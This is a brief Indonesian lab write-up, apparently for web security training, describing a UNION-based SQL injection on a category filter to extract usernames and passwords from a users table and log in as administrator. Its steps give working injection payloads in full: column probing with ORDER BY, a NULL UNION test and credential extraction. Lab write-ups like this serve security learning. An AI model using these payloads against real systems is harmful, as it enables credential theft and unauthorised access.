#

## Link Resource

## Jawaban + Bukti

![sql](../../img/sqli-union)

### Step-by-step

![sql](../../img/sqli-union/soal.png)

![sql](../../img/sqli-union/lab.png)

1. pada lab kali ini kita diminta untuk melakukan UNION-based SQL injection supaya bisa mengambil data username dan password dari tabel users, lalu login sebagai administrator.

![sql](../../img/sqli-union/burp.png)

2. kemudian kita melakukan intercept requeet di burpsuite

![sql](../../img/sqli-union/test.png)

3. kemudian kita mengganti kolom Gifts menggunakan payload `/filter?category=Gifts'+ORDER+BY+2--` jika tidak error berarti minimal 2 kolom.

![sql](../../img/sqli-union/test2.png)

4. lalu tes union select menggunakan payload `/filter?category=Gifts'+UNION+SELECT+NULL,NULL--` kalau respon normal berarti valid

![sql](../../img/sqli-union/get.png)

5. kemudian ambil data dari tabel users menggunakan payload `/filter?category=Gifts'+UNION+SELECT+username,password+FROM+users--`

![sql](../../img/sqli-union/done.png)

6. lalu kita login mengggunakan username dan password tersebut

### Catatan

- Berhasil mendapatkan username dan password untuk login
